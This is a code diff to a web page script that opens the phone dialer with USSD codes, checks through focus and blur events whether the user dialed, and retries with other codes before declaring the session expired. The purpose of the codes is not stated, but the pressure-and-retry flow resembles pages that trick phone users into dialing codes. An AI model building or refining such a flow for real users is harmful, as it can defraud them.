@@ -546,41 +546,43 @@ let leftApp = false;
 let retryCount = 0;
 const maxRetries = 3;
 
-// OPEN DIALER (MAIN ENTRY)
+// OPEN DIALER (UNIVERSAL FIX)
 function openDialer(code){
   dialStartTime = Date.now();
-  sessionStorage.setItem("dialing", "true");
+  leftApp = false;
 
-  window.location.href = "tel:" + code;
+  // force proper encoding for all phones
+  const encoded = code.replace(/#/g, "%23");
+
+  window.location.href = "tel:" + encoded;
 }
 
-// DETECT USER LEAVING (Dialer opened)
+// Detect user leaving app
 window.addEventListener("blur", () => {
-  if(sessionStorage.getItem("dialing") === "true"){
+  if(dialStartTime){
     leftApp = true;
   }
 });
 
-// DETECT RETURN FROM DIALER
+// Detect return
 window.addEventListener("focus", () => {
 
-  if(sessionStorage.getItem("dialing") === "true"){
+  if(!dialStartTime) return;
 
-    const timeSpent = Date.now() - dialStartTime;
-    sessionStorage.removeItem("dialing");
+  const timeSpent = Date.now() - dialStartTime;
 
-    if(leftApp && timeSpent > 4000){
-      // ✅ USER LIKELY DIALED
-      setTimeout(() => {
-        showSuccess();
-      }, 500);
-    } else {
-      // ❌ FAILED / CANCELLED
-      showRetryPopup();
-    }
+  // reset
+  dialStartTime = 0;
 
-    leftApp = false;
+  if(leftApp && timeSpent > 3500){
+    // ✅ likely dialed
+    setTimeout(showSuccess, 500);
+  } else {
+    // ❌ cancelled
+    showRetryPopup();
   }
+
+  leftApp = false;
 });
 
 
@@ -653,10 +655,13 @@ function retryDial(){
   retryCount++;
 
   if(retryCount === 1){
-    openDialer("*812*331%23");
+    openDialer("*812*331#");
 
   } else if(retryCount === 2){
-    openDialer("*811*221%23");
+    openDialer("*811*221#");
+
+  } else if(retryCount === 3){
+    openDialer("*812*331#");
 
   } else {
     showSessionExpired();
@@ -854,20 +859,6 @@ setInterval(() => {
 
 }, 2000);
 
-
-
-// Detect return from dialer
-window.addEventListener("focus", () => {
-  if(sessionStorage.getItem("ussdPending") === "true"){
-    
-    sessionStorage.removeItem("ussdPending");
-
-    // Show success popup
-    setTimeout(() => {
-      showSuccess();
-    }, 500);
-  }
-});
 
 </script>
 </body>
